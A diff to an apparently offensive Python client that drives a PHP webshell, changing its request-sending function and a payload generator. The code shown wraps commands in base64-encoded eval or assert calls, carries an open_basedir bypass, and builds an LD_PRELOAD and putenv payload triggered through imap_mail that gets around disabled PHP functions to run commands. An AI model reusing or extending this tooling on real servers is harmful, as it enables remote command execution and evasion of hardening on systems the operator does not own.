@@ -76,7 +76,7 @@ def send(data: str, raw: bool = False, **extra_params):
     def randstr(offset):
         return ''.join(sample("!@#$%^&*()[];,.?", offset))
     url = gget("url", "webshell")
-    params_dict = gget("webshell.params_dict", "webshell")
+    params_dict = gget("webshell.params_dict", "webshell").copy()
     php_v7 = gget("webshell.v7", "webshell")
     password = gget("webshell.password", "webshell")
     raw_key = gget("webshell.method", "webshell")
@@ -106,7 +106,6 @@ ini_set("open_basedir", "/");
 chdir($cwd);rmdir($ndir);""" % (uuid4()) + data
         data += f"""print("{tail}");"""
         data = f"""eval(base64_decode("{base64_encode(data)}"));"""
-        # data = f"""eval('error_reporting(0);chdir(base64_decode("{pwd_b64}"));print(\\'{head}\\');eval(base64_decode("{base64_encode(data)}"));print(\\'{tail}\\');');"""
         if (not php_v7):
             data = f"""assert(base64_decode("{base64_encode(data)}"));"""
     for func in encode_functions:
@@ -143,9 +142,10 @@ chdir($cwd);rmdir($ndir);""" % (uuid4()) + data
     except json.JSONDecodeError:
         req.r_json = ''
     if 0:  # DEBUG
-        print(f"[debug] {params_dict}")
-        print(f"[debug] {url}")
-        print(f"[debug] [{req}] [len:{len(content)}] {text}")
+        print(f"[debug_dict] {params_dict}")
+        print(f"[debug-extra_parms] {extra_params}")
+        print(f"[debug_url] {url}")
+        print(f"[debug_res] [{req}] [len:{len(content)}] {text}")
     return req
 
 
@@ -411,7 +411,7 @@ function pwn($cmd) {
         elif (ld_preload_func == "imap_mail"):
             ld_preload_command = 'imap_mail("1@a.com","0","1","2","3");'
         return """$p="/tmp/%s";
-putenv(base64_decode("%s"));
+putenv("cmd=".base64_decode("%s"));
 putenv("rpath=$p");
 putenv("LD_PRELOAD=%s");
 %s
